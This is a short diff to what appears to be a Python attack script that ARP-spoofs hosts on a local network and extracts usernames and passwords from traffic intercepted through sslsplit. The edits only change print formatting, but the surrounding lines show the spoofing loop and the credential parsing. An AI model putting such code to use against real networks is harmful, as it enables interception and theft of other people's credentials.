@@ -74,7 +74,7 @@ def sslsplit():
             if host == True and "username" in line and "password" in line:
                 user = line.split("&")
                 print("Username: ", user[1][9:])
-                print("Password: ", user[2][9:])
+                print("Password: ", user[2][9:], "\n")
 
 def restore(destination_ip, source_ip):
     destination_mac = scan[destination_ip]
@@ -100,7 +100,7 @@ def main():
     s.start()
 
     try:
-        print("ARP spoofing...\n")
+        print("\nARP spoofing...\n")
         while True:
             for ip in scan.keys():
                 if ip != gateway_ip:
@@ -108,7 +108,7 @@ def main():
                     spoof(gateway_ip, ip)
             time.sleep(2)  # waits for two seconds
     except KeyboardInterrupt:
-        print("keyboard interrupt........Exiting")
+        print("\nkeyboard interrupt........Exiting")
         for ip in scan.keys():
             if ip != gateway_ip:
                 restore(gateway_ip, ip)
